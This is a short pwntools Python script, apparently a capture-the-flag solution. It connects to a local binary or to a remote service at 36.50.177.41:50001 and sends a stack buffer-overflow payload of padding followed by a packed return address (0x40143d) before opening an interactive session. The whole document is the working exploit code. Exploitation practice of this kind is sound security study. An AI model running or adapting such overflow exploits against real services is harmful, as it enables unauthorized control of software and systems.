#!/usr/bin/env python3
from pwn import *
exe = ELF("./main", checksec=False)
context.binary=exe
context.arch = 'amd64'
def conn():
    if args.REMOTE:
        r = remote("36.50.177.41", 50001)
        
    else:
        r = process([exe.path])
    return r
r = conn()
input()
main = 0x40143d
r.sendline(b'A'*8 + b'C'*0x400 + p64(main))
r.interactive()